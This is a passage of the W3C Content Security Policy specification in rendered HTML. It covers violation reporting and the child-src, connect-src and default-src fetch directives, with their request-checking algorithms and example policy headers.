              <p><var>violation</var>’s <a data-link-type="dfn" href="#violation-global-object" id="ref-for-violation-global-object⑦">global object</a>’s <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#relevant-settings-object" id="ref-for-relevant-settings-object①">relevant
  settings object</a></p>
             <dt data-md><a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-destination" id="ref-for-concept-request-destination">destination</a>
             <dd data-md>
              <p>"<code>report</code>"</p>
             <dt data-md><a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-initiator" id="ref-for-concept-request-initiator">initiator</a>
             <dd data-md>
              <p>""</p>
             <dt data-md><a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-credentials-mode" id="ref-for-concept-request-credentials-mode">credentials mode</a>
             <dd data-md>
              <p>"<code>same-origin</code>"</p>
             <dt data-md><a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#request-keepalive-flag" id="ref-for-request-keepalive-flag">keepalive</a>
             <dd data-md>
              <p>"<code>true</code>"</p>
             <dt data-md><a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-header-list" id="ref-for-concept-request-header-list">header list</a>
             <dd data-md>
              <p>A header list containing a single header whose name is
  "<code>Content-Type</code>", and value is "<code>application/csp-report</code>"</p>
             <dt data-md><a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-body" id="ref-for-concept-request-body">body</a>
             <dd data-md>
              <p>The result of executing <a href="#deprecated-serialize-violation">§ 5.2 Obtain the deprecated serialization of violation</a> on <var>violation</var></p>
             <dt data-md><a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-redirect-mode" id="ref-for-concept-request-redirect-mode">redirect mode</a>
             <dd data-md>
              <p>"<code>error</code>"</p>
            </dl>
            <p class="note" role="note"><span class="marker">Note:</span> <var>request</var>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-mode" id="ref-for-concept-request-mode">mode</a> defaults to "<code>no-cors</code>"; the response is ignored entirely.</p>
           <li data-md>
            <p><a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-fetch" id="ref-for-concept-fetch">Fetch</a> <var>request</var>. The result will be ignored.</p>
          </ol>
        </ol>
        <p class="note" role="note"><span class="marker">Note:</span> All of this should be considered deprecated. It sends a single
  request per violation, which simply isn’t scalable. As soon as this
  behavior can be removed from user agents, it will be.</p>
        <p class="note" role="note"><span class="marker">Note:</span> <code>report-uri</code> only takes effect if <code>report-to</code> is not present. That
  is, the latter overrides the former, allowing for backwards compatibility
  with browsers that don’t support the new mechanism.</p>
       <li data-md>
        <p>If <var>violation</var>’s <a data-link-type="dfn" href="#violation-policy" id="ref-for-violation-policy⑧">policy</a>’s <a data-link-type="dfn" href="#policy-directive-set" id="ref-for-policy-directive-set⑨">directive
  set</a> contains a <a data-link-type="dfn" href="#directives" id="ref-for-directives①③">directive</a> named "<a data-link-type="dfn" href="#report-to" id="ref-for-report-to②"><code>report-to</code></a>"
  (<var>directive</var>):</p>
        <ol>
         <li data-md>
          <p>Let <var>body</var> be a new <code class="idl"><a data-link-type="idl" href="#cspviolationreportbody" id="ref-for-cspviolationreportbody">CSPViolationReportBody</a></code>, initialized as
  follows:</p>
          <dl>
           <dt data-md><code class="idl"><a data-link-type="idl" href="#dom-cspviolationreportbody-documenturl" id="ref-for-dom-cspviolationreportbody-documenturl">documentURL</a></code>
           <dd data-md>
            <p>The result of executing the <a data-link-type="dfn" href="https://url.spec.whatwg.org/#concept-url-serializer" id="ref-for-concept-url-serializer⑧">URL serializer</a> on <var>violation</var>’s <a data-link-type="dfn" href="#violation-url" id="ref-for-violation-url④">url</a>, with the <code>exclude fragment</code> flag set.</p>
           <dt data-md><code class="idl"><a data-link-type="idl" href="#dom-cspviolationreportbody-referrer" id="ref-for-dom-cspviolationreportbody-referrer">referrer</a></code>
           <dd data-md>
            <p>The result of executing the <a data-link-type="dfn" href="https://url.spec.whatwg.org/#concept-url-serializer" id="ref-for-concept-url-serializer⑨">URL serializer</a> on <var>violation</var>’s <a data-link-type="dfn" href="#violation-referrer" id="ref-for-violation-referrer③">referrer</a>, with the <code>exclude fragment</code> flag set.</p>
           <dt data-md><code class="idl"><a data-link-type="idl" href="#dom-cspviolationreportbody-blockedurl" id="ref-for-dom-cspviolationreportbody-blockedurl">blockedURL</a></code>
           <dd data-md>
            <p>The result of executing the <a data-link-type="dfn" href="https://url.spec.whatwg.org/#concept-url-serializer" id="ref-for-concept-url-serializer①⓪">URL serializer</a> on <var>violation</var>’s <a data-link-type="dfn" href="#violation-resource" id="ref-for-violation-resource①⓪">resource</a>, with the <code>exclude fragment</code> flag set.</p>
           <dt data-md><code class="idl"><a data-link-type="idl" href="#dom-cspviolationreportbody-effectivedirective" id="ref-for-dom-cspviolationreportbody-effectivedirective">effectiveDirective</a></code>
           <dd data-md>
            <p><var>violation</var>’s <a data-link-type="dfn" href="#violation-effective-directive" id="ref-for-violation-effective-directive③">effective directive</a>.</p>
           <dt data-md><code class="idl"><a data-link-type="idl" href="#dom-cspviolationreportbody-originalpolicy" id="ref-for-dom-cspviolationreportbody-originalpolicy">originalPolicy</a></code>
           <dd data-md>
            <p>The <a data-link-type="dfn" href="#serialized-csp" id="ref-for-serialized-csp⑧">serialization</a> of <var>violation</var>’s <a data-link-type="dfn" href="#violation-policy" id="ref-for-violation-policy⑨">policy</a>.</p>
           <dt data-md><code class="idl"><a data-link-type="idl" href="#dom-cspviolationreportbody-sourcefile" id="ref-for-dom-cspviolationreportbody-sourcefile">sourceFile</a></code>
           <dd data-md>
            <p>The result of executing the <a data-link-type="dfn" href="https://url.spec.whatwg.org/#concept-url-serializer" id="ref-for-concept-url-serializer①①">URL serializer</a> on <var>violation</var>’s <a data-link-type="dfn" href="#violation-source-file" id="ref-for-violation-source-file⑥">source file</a>, with the <code>exclude fragment</code> flag set, if <var>violation</var>’s <a data-link-type="dfn" href="#violation-source-file" id="ref-for-violation-source-file⑦">source file</a> is not null, or null
  otherwise.</p>
           <dt data-md><code class="idl"><a data-link-type="idl" href="#dom-cspviolationreportbody-sample" id="ref-for-dom-cspviolationreportbody-sample">sample</a></code>
           <dd data-md>
            <p><var>violation</var>’s <a data-link-type="dfn" href="#violation-sample" id="ref-for-violation-sample⑥">sample</a>.</p>
           <dt data-md><code class="idl"><a data-link-type="idl" href="#dom-cspviolationreportbody-disposition" id="ref-for-dom-cspviolationreportbody-disposition">disposition</a></code>
           <dd data-md>
            <p><var>violation</var>’s <a data-link-type="dfn" href="#violation-disposition" id="ref-for-violation-disposition①">disposition</a>.</p>
           <dt data-md><code class="idl"><a data-link-type="idl" href="#dom-cspviolationreportbody-statuscode" id="ref-for-dom-cspviolationreportbody-statuscode">statusCode</a></code>
           <dd data-md>
            <p><var>violation</var>’s <a data-link-type="dfn" href="#violation-status" id="ref-for-violation-status③">status</a>.</p>
           <dt data-md><code class="idl"><a data-link-type="idl" href="#dom-cspviolationreportbody-linenumber" id="ref-for-dom-cspviolationreportbody-linenumber">lineNumber</a></code>
           <dd data-md>
            <p><var>violation</var>’s <a data-link-type="dfn" href="#violation-line-number" id="ref-for-violation-line-number④">line number</a>, if <var>violation</var>’s <a data-link-type="dfn" href="#violation-source-file" id="ref-for-violation-source-file⑧">source file</a> is not null,
  or null otherwise.</p>
           <dt data-md><code class="idl"><a data-link-type="idl" href="#dom-cspviolationreportbody-columnnumber" id="ref-for-dom-cspviolationreportbody-columnnumber">columnNumber</a></code>
           <dd data-md>
            <p><var>violation</var>’s <a data-link-type="dfn" href="#violation-column-number" id="ref-for-violation-column-number④">column number</a>, if <var>violation</var>’s <a data-link-type="dfn" href="#violation-source-file" id="ref-for-violation-source-file⑨">source file</a> is not null,
  or null otherwise.</p>
          </dl>
         <li data-md>
          <p>Let <var>settings object</var> be <var>violation</var>’s <a data-link-type="dfn" href="#violation-global-object" id="ref-for-violation-global-object⑧">global
  object</a>’s <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#relevant-settings-object" id="ref-for-relevant-settings-object②">relevant settings object</a>.</p>
         <li data-md>
          <p>Execute <a data-link-type="biblio" href="#biblio-reporting" title="Reporting API">[REPORTING]</a>'s <a data-link-type="dfn" href="https://w3c.github.io/reporting/#queue-report" id="ref-for-queue-report">Queue <var>data</var> as <var>type</var> for <var>endpoint group</var> on <var>settings</var></a> algorithm with the
  following arguments:</p>
          <dl>
           <dt data-md><var>data</var>
           <dd data-md>
            <p><var>body</var></p>
           <dt data-md><var>type</var>
           <dd data-md>
            <p>"csp-violation"</p>
           <dt data-md><var>endpoint group</var>
           <dd data-md>
            <p><var>directive</var>’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value⑤">value</a>.</p>
           <dt data-md><var>settings</var>
           <dd data-md>
            <p><var>settings object</var></p>
          </dl>
        </ol>
      </ol>
    </ol>
   </section>
   <section>
    <h2 class="heading settled" data-level="6" id="csp-directives"><span class="secno">6. </span><span class="content"> Content Security Policy Directives </span><a class="self-link" href="#csp-directives"></a></h2>
    <p>This specification defines a number of types of <a data-link-type="dfn" href="#directives" id="ref-for-directives①④">directives</a> which allow
  developers to control certain aspects of their sites' behavior. This document
  defines directives which govern resource fetching (in <a href="#directives-fetch">§ 6.1 Fetch Directives</a>),
  directives which govern the state of a document (in <a href="#directives-document">§ 6.2 Document Directives</a>),
  directives which govern aspects of navigation (in <a href="#directives-navigation">§ 6.3 Navigation Directives</a>),
  and directives which govern reporting (in <a href="#directives-reporting">§ 6.4 Reporting Directives</a>). These
  form the core of Content Security Policy; other directives are defined in a
  modular fashion in ancillary documents (see <a href="#directives-elsewhere">§ 6.5 Directives Defined in Other Documents</a> for
  examples).</p>
    <p>To mitigate the risk of cross-site scripting attacks, web developers SHOULD
  include directives that regulate sources of script and plugins. They can do
  so by including:</p>
    <ul>
     <li data-md>
      <p>Both the <a data-link-type="dfn" href="#script-src" id="ref-for-script-src">script-src</a> and <a data-link-type="dfn" href="#object-src" id="ref-for-object-src">object-src</a> directives, or</p>
     <li data-md>
      <p>a <a data-link-type="dfn" href="#default-src" id="ref-for-default-src">default-src</a> directive</p>
    </ul>
    <p>In either case, developers SHOULD NOT include either <a data-link-type="grammar" href="#grammardef-unsafe-inline" id="ref-for-grammardef-unsafe-inline"><code>'unsafe-inline'</code></a>, or <code>data:</code> as valid
  sources in their policies. Both enable XSS attacks by allowing code to be
  included directly in the document itself; they are best avoided completely.</p>
    <h3 class="heading settled" data-level="6.1" id="directives-fetch"><span class="secno">6.1. </span><span class="content"> Fetch Directives </span><a class="self-link" href="#directives-fetch"></a></h3>
    <p><dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="fetch-directives">Fetch directives</dfn> control the locations from which certain resource
  types may be loaded. For instance, <a data-link-type="dfn" href="#script-src" id="ref-for-script-src①">script-src</a> allows developers to allow
  trusted sources of script to execute on a page, while <a data-link-type="dfn" href="#font-src" id="ref-for-font-src">font-src</a> controls the
  sources of web fonts.</p>
    <h4 class="heading settled" data-level="6.1.1" id="directive-child-src"><span class="secno">6.1.1. </span><span class="content"><code>child-src</code></span><a class="self-link" href="#directive-child-src"></a></h4>
    <p>The <dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="child-src"><code>child-src</code></dfn> directive governs the creation of <a data-link-type="dfn">nested browsing
  contexts</a> (e.g. <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-iframe-element" id="ref-for-the-iframe-element">iframe</a></code> and <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/obsolete.html#frame" id="ref-for-frame">frame</a></code> navigations) and Worker execution
  contexts. The syntax for the directive’s name and value is described by the
  following ABNF:</p>
<pre>directive-name  = "child-src"
directive-value = <a data-link-type="grammar" href="#grammardef-serialized-source-list" id="ref-for-grammardef-serialized-source-list">serialized-source-list</a>
</pre>
    <p>This directive controls <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request①⑦">requests</a> which will populate a frame or a
  worker. More formally, <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request①⑧">requests</a> falling into one of the
  following categories:</p>
    <ul>
     <li data-md>
      <p><a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-destination" id="ref-for-concept-request-destination①">destination</a> is "<code>document</code>", and whose <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-target-browsing-context" id="ref-for-concept-request-target-browsing-context">target browsing context</a> is a <a data-link-type="dfn">nested browsing
 context</a> (e.g. requests which will populate an <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-iframe-element" id="ref-for-the-iframe-element①">iframe</a></code> or <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/obsolete.html#frame" id="ref-for-frame①">frame</a></code> element)</p>
     <li data-md>
      <p><a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-destination" id="ref-for-concept-request-destination②">destination</a> is either "<code>serviceworker</code>",
 "<code>sharedworker</code>", or "<code>worker</code>" (which are fed to the <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/workers.html#run-a-worker" id="ref-for-run-a-worker①">run a worker</a> algorithm for <code class="idl"><a data-link-type="idl" href="https://www.w3.org/TR/service-workers/#serviceworker" id="ref-for-serviceworker">ServiceWorker</a></code>, <code class="idl"><a data-link-type="idl" href="https://html.spec.whatwg.org/multipage/workers.html#sharedworker" id="ref-for-sharedworker">SharedWorker</a></code>, and <code class="idl"><a data-link-type="idl" href="https://html.spec.whatwg.org/multipage/workers.html#worker" id="ref-for-worker①">Worker</a></code>,
 respectively).</p>
    </ul>
    <div class="example" id="example-55db5b11">
     <a class="self-link" href="#example-55db5b11"></a> Given a page with the following Content Security Policy: 
<pre><a data-link-type="http-header" href="#header-content-security-policy" id="ref-for-header-content-security-policy③">Content-Security-Policy</a>: <a data-link-type="dfn" href="#child-src" id="ref-for-child-src">child-src</a> https://example.com/
</pre>
     <p>Fetches for the following code will all return network errors, as the URLs
    provided do not match <code>child-src</code>’s <a data-link-type="dfn" href="#source-lists" id="ref-for-source-lists">source list</a>:</p>
<pre class="highlight"><c- p>&lt;</c-><c- f>iframe</c-> <c- e>src</c-><c- o>=</c-><c- s>"https://example.org"</c-><c- p>>&lt;/</c-><c- f>iframe</c-><c- p>></c->
<c- p>&lt;</c-><c- f>script</c-><c- p>></c->
  <c- a>var</c-> blockedWorker <c- o>=</c-> <c- ow>new</c-> Worker<c- p>(</c-><c- u>"data:application/javascript,..."</c-><c- p>);</c->
<c- p>&lt;/</c-><c- f>script</c-><c- p>></c->
</pre>
    </div>
    <h5 class="heading settled algorithm" data-algorithm="child-src Pre-request check" data-level="6.1.1.1" id="child-src-pre-request"><span class="secno">6.1.1.1. </span><span class="content"> <code>child-src</code> Pre-request check </span><a class="self-link" href="#child-src-pre-request"></a></h5>
    <p>This directive’s <a data-link-type="dfn" href="#directive-pre-request-check" id="ref-for-directive-pre-request-check①">pre-request check</a> is as follows:</p>
    <p>Given a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request①⑨">request</a> (<var>request</var>) and a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object③①">policy</a> (<var>policy</var>):</p>
    <ol>
     <li data-md>
      <p>Let <var>name</var> be the result of executing <a href="#effective-directive-for-a-request">§ 6.7.1 Get the effective directive for request</a> on <var>request</var>.</p>
     <li data-md>
      <p>If the result of executing <a href="#should-directive-execute">§ 6.7.4 Should fetch directive execute</a> on <var>name</var>, <code>child-src</code> and <var>policy</var> is "<code>No</code>", return "<code>Allowed</code>".</p>
     <li data-md>
      <p>Return the result of executing the <a data-link-type="dfn" href="#directive-pre-request-check" id="ref-for-directive-pre-request-check②">pre-request
  check</a> for the <a data-link-type="dfn" href="#directives" id="ref-for-directives①⑤">directive</a> whose <a data-link-type="dfn" href="#directive-name" id="ref-for-directive-name⑧">name</a> is <var>name</var> on <var>request</var> and <var>policy</var>, using this directive’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value⑥">value</a> for the comparison.</p>
    </ol>
    <h5 class="heading settled algorithm" data-algorithm="child-src Post-request check" data-level="6.1.1.2" id="child-src-post-request"><span class="secno">6.1.1.2. </span><span class="content"> <code>child-src</code> Post-request check </span><a class="self-link" href="#child-src-post-request"></a></h5>
    <p>This directive’s <a data-link-type="dfn" href="#directive-post-request-check" id="ref-for-directive-post-request-check②">post-request check</a> is as follows:</p>
    <p>Given a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request②⓪">request</a> (<var>request</var>), a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response①⑧">response</a> (<var>response</var>), and a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object③②">policy</a> (<var>policy</var>):</p>
    <ol>
     <li data-md>
      <p>Let <var>name</var> be the result of executing <a href="#effective-directive-for-a-request">§ 6.7.1 Get the effective directive for request</a> on <var>request</var>.</p>
     <li data-md>
      <p>If the result of executing <a href="#should-directive-execute">§ 6.7.4 Should fetch directive execute</a> on <var>name</var>, <code>child-src</code> and <var>policy</var> is "<code>No</code>", return "<code>Allowed</code>".</p>
     <li data-md>
      <p>Return the result of executing the <a data-link-type="dfn" href="#directive-post-request-check" id="ref-for-directive-post-request-check③">post-request
  check</a> for the <a data-link-type="dfn" href="#directives" id="ref-for-directives①⑥">directive</a> whose <a data-link-type="dfn" href="#directive-name" id="ref-for-directive-name⑨">name</a> is <var>name</var> on <var>request</var>, <var>response</var>, and <var>policy</var>, using this directive’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value⑦">value</a> for the comparison.</p>
    </ol>
    <h4 class="heading settled" data-level="6.1.2" id="directive-connect-src"><span class="secno">6.1.2. </span><span class="content"><code>connect-src</code></span><a class="self-link" href="#directive-connect-src"></a></h4>
    <p>The <dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="connect-src">connect-src</dfn> directive restricts the URLs which can be loaded
  using script interfaces. The syntax for the directive’s name and value is
  described by the following ABNF:</p>
<pre>directive-name  = "connect-src"
directive-value = <a data-link-type="grammar" href="#grammardef-serialized-source-list" id="ref-for-grammardef-serialized-source-list①">serialized-source-list</a>
</pre>
    <p>This directive controls <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request②①">requests</a> which transmit or receive data from
  other origins. This includes APIs like <code>fetch()</code>, <a data-link-type="biblio" href="#biblio-xhr" title="XMLHttpRequest Standard">[XHR]</a>, <a data-link-type="biblio" href="#biblio-eventsource" title="Server-Sent Events">[EVENTSOURCE]</a>, <a data-link-type="biblio" href="#biblio-beacon" title="Beacon">[BEACON]</a>, and <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/text-level-semantics.html#the-a-element" id="ref-for-the-a-element">a</a></code>'s <code><a data-link-type="element-sub" href="https://html.spec.whatwg.org/multipage/links.html#ping" id="ref-for-ping">ping</a></code>. This directive <em>also</em> controls
  WebSocket <a data-link-type="biblio" href="#biblio-websockets" title="WebSockets Standard">[WEBSOCKETS]</a> connections, though those aren’t technically part
  of Fetch.</p>
    <div class="example" id="example-03b12b1d">
     <a class="self-link" href="#example-03b12b1d"></a> JavaScript offers a few mechanisms that directly connect to an external
    server to send or receive information. <code>EventSource</code> maintains an open
    HTTP connection to a server in order to receive push notifications, <code>WebSockets</code> open a bidirectional communication channel between your
    browser and a server, and <code>XMLHttpRequest</code> makes arbitrary HTTP requests
    on your behalf. These are powerful APIs that enable useful functionality,
    but also provide tempting avenues for data exfiltration. 
     <p>The <code>connect-src</code> directive allows you to ensure that these and similar
    sorts of connections are only opened to origins you trust. Sending a
    policy that defines a list of source expressions for this directive is
    straightforward. For example, to limit connections to only <code>https://example.com</code>, send the following header:</p>
<pre><a data-link-type="http-header" href="#header-content-security-policy" id="ref-for-header-content-security-policy④">Content-Security-Policy</a>: <a data-link-type="dfn" href="#connect-src" id="ref-for-connect-src">connect-src</a> https://example.com/
</pre>
     <p>Fetches for the following code will all return network errors, as the URLs
    provided do not match <code>connect-src</code>’s <a data-link-type="dfn" href="#source-lists" id="ref-for-source-lists①">source list</a>:</p>
<pre class="highlight"><c- p>&lt;</c-><c- f>a</c-> <c- e>ping</c-><c- o>=</c-><c- s>"https://example.org"</c-><c- p>></c->...
<c- p>&lt;</c-><c- f>script</c-><c- p>></c->
  <c- a>var</c-> xhr <c- o>=</c-> <c- ow>new</c-> XMLHttpRequest<c- p>();</c->
  xhr<c- p>.</c->open<c- p>(</c-><c- t>'GET'</c-><c- p>,</c-> <c- t>'https://example.org/'</c-><c- p>);</c->
  xhr<c- p>.</c->send<c- p>();</c->

  <c- a>var</c-> ws <c- o>=</c-> <c- ow>new</c-> WebSocket<c- p>(</c-><c- u>"wss://example.org/"</c-><c- p>);</c->

  <c- a>var</c-> es <c- o>=</c-> <c- ow>new</c-> EventSource<c- p>(</c-><c- u>"https://example.org/"</c-><c- p>);</c->

  navigator<c- p>.</c->sendBeacon<c- p>(</c-><c- u>"https://example.org/"</c-><c- p>,</c-> <c- p>{</c-> <c- p>...</c-> <c- p>});</c->
<c- p>&lt;/</c-><c- f>script</c-><c- p>></c->
</pre>
    </div>
    <h5 class="heading settled algorithm" data-algorithm="connect-src Pre-request check" data-level="6.1.2.1" id="connect-src-pre-request"><span class="secno">6.1.2.1. </span><span class="content"> <code>connect-src</code> Pre-request check </span><a class="self-link" href="#connect-src-pre-request"></a></h5>
    <p>This directive’s <a data-link-type="dfn" href="#directive-pre-request-check" id="ref-for-directive-pre-request-check③">pre-request check</a> is as follows:</p>
    <p>Given a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request②②">request</a> (<var>request</var>) and a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object③③">policy</a> (<var>policy</var>):</p>
    <ol>
     <li data-md>
      <p>Let <var>name</var> be the result of executing <a href="#effective-directive-for-a-request">§ 6.7.1 Get the effective directive for request</a> on <var>request</var>.</p>
     <li data-md>
      <p>If the result of executing <a href="#should-directive-execute">§ 6.7.4 Should fetch directive execute</a> on <var>name</var>, <code>connect-src</code> and <var>policy</var> is "<code>No</code>", return "<code>Allowed</code>".</p>
     <li data-md>
      <p>If the result of executing <a href="#match-request-to-source-list">§ 6.6.2.3 Does request match source list?</a> on <var>request</var>, this directive’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value⑧">value</a>, and <var>policy</var>, is "<code>Does Not Match</code>", return "<code>Blocked</code>".</p>
     <li data-md>
      <p>Return "<code>Allowed</code>".</p>
    </ol>
    <h5 class="heading settled algorithm" data-algorithm="connect-src Post-request check" data-level="6.1.2.2" id="connect-src-post-request"><span class="secno">6.1.2.2. </span><span class="content"> <code>connect-src</code> Post-request check </span><a class="self-link" href="#connect-src-post-request"></a></h5>
    <p>This directive’s <a data-link-type="dfn" href="#directive-post-request-check" id="ref-for-directive-post-request-check④">post-request check</a> is as follows:</p>
    <p>Given a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request②③">request</a> (<var>request</var>), a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response①⑨">response</a> (<var>response</var>), and a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object③④">policy</a> (<var>policy</var>):</p>
    <ol>
     <li data-md>
      <p>Let <var>name</var> be the result of executing <a href="#effective-directive-for-a-request">§ 6.7.1 Get the effective directive for request</a> on <var>request</var>.</p>
     <li data-md>
      <p>If the result of executing <a href="#should-directive-execute">§ 6.7.4 Should fetch directive execute</a> on <var>name</var>, <code>connect-src</code> and <var>policy</var> is "<code>No</code>", return "<code>Allowed</code>".</p>
     <li data-md>
      <p>If the result of executing <a href="#match-response-to-source-list">§ 6.6.2.4 Does response to request match source list?</a> on <var>response</var>, <var>request</var>, this directive’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value⑨">value</a>,
  and <var>policy</var>, is "<code>Does Not Match</code>", return "<code>Blocked</code>".</p>
     <li data-md>
      <p>Return "<code>Allowed</code>".</p>
    </ol>
    <h4 class="heading settled" data-level="6.1.3" id="directive-default-src"><span class="secno">6.1.3. </span><span class="content"><code>default-src</code></span><a class="self-link" href="#directive-default-src"></a></h4>
    <p>The <dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="default-src">default-src</dfn> directive serves as a fallback for the other <a data-link-type="dfn" href="#fetch-directives" id="ref-for-fetch-directives">fetch directives</a>. The syntax for the directive’s name and value is described by
  the following ABNF:</p>
<pre>directive-name  = "default-src"
directive-value = <a data-link-type="grammar" href="#grammardef-serialized-source-list" id="ref-for-grammardef-serialized-source-list②">serialized-source-list</a>
</pre>
    <p>If a <a data-link-type="dfn" href="#default-src" id="ref-for-default-src①">default-src</a> directive is present in a policy, its value will be
  used as the policy’s default source list. That is, given <code>default-src 'none';   script-src 'self'</code>, script requests will use <code>'self'</code> as the <a data-link-type="dfn" href="#source-lists" id="ref-for-source-lists②">source
  list</a> to match against. Other requests will use <code>'none'</code>. This is spelled
  out in more detail in the <a href="#should-block-request" id="ref-for-should-block-request③">§ 4.1.3 Should request be blocked by Content Security Policy?</a> and <a href="#should-block-response" id="ref-for-should-block-response④">§ 4.1.4 Should response to request be blocked by Content Security Policy?</a> algorithms.</p>
    <div class="example" id="example-327c55f5">
     <a class="self-link" href="#example-327c55f5"></a> The following header: 
<pre><a data-link-type="http-header" href="#header-content-security-policy" id="ref-for-header-content-security-policy⑤">Content-Security-Policy</a>: <a data-link-type="dfn" href="#default-src" id="ref-for-default-src②">default-src</a> <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self⑥">'self'</a>
</pre>
     <p>will have the same behavior as the following header:</p>
<pre><a data-link-type="http-header" href="#header-content-security-policy" id="ref-for-header-content-security-policy⑥">Content-Security-Policy</a>: <a data-link-type="dfn" href="#connect-src" id="ref-for-connect-src①">connect-src</a> <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self⑦">'self'</a>;
                         <a data-link-type="dfn" href="#font-src" id="ref-for-font-src①">font-src</a> <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self⑧">'self'</a>;
                         <a data-link-type="dfn" href="#frame-src" id="ref-for-frame-src">frame-src</a> <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self⑨">'self'</a>;
                         <a data-link-type="dfn" href="#img-src" id="ref-for-img-src">img-src</a> <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self①⓪">'self'</a>;
                         <a data-link-type="dfn" href="#manifest-src" id="ref-for-manifest-src">manifest-src</a> <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self①①">'self'</a>;
                         <a data-link-type="dfn" href="#media-src" id="ref-for-media-src">media-src</a> <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self①②">'self'</a>;
                         <a data-link-type="dfn" href="#prefetch-src" id="ref-for-prefetch-src">prefetch-src</a> <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self①③">'self'</a>;
                         <a data-link-type="dfn" href="#object-src" id="ref-for-object-src①">object-src</a> <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self①④">'self'</a>;
                         <a data-link-type="dfn" href="#script-src-elem" id="ref-for-script-src-elem">script-src-elem</a> <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self①⑤">'self'</a>;
                         <a data-link-type="dfn" href="#script-src-attr" id="ref-for-script-src-attr">script-src-attr</a> <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self①⑥">'self'</a>;
                         <a data-link-type="dfn" href="#style-src-elem" id="ref-for-style-src-elem">style-src-elem</a> <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self①⑦">'self'</a>;
                         <a data-link-type="dfn" href="#style-src-attr" id="ref-for-style-src-attr">style-src-attr</a> <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self①⑧">'self'</a>;
                         <a data-link-type="dfn" href="#worker-src" id="ref-for-worker-src">worker-src</a> <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self①⑨">'self'</a>
</pre>
     <p>That is, when <code>default-src</code> is set, every <a data-link-type="dfn" href="#fetch-directives" id="ref-for-fetch-directives①">fetch directive</a> that isn’t
    explicitly set will fall back to the value <code>default-src</code> specifies.</p>
    </div>
    <div class="example" id="example-8536160a">
     <a class="self-link" href="#example-8536160a"></a> There is no inheritance. If a <code>script-src</code> directive is explicitly
    specified, for example, then the value of <code>default-src</code> has no influence on
    script requests. That is, the following header: 
<pre><a data-link-type="http-header" href="#header-content-security-policy" id="ref-for-header-content-security-policy⑦">Content-Security-Policy</a>: <a data-link-type="dfn" href="#default-src" id="ref-for-default-src③">default-src</a> <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self②⓪">'self'</a>; <a data-link-type="dfn" href="#script-src-elem" id="ref-for-script-src-elem①">script-src-elem</a> https://example.com
</pre>
     <p>will have the same behavior as the following header:</p>
<pre><a data-link-type="http-header" href="#header-content-security-policy" id="ref-for-header-content-security-policy⑧">Content-Security-Policy</a>: <a data-link-type="dfn" href="#connect-src" id="ref-for-connect-src②">connect-src</a> <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self②①">'self'</a>;
                         <a data-link-type="dfn" href="#font-src" id="ref-for-font-src②">font-src</a> <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self②②">'self'</a>;
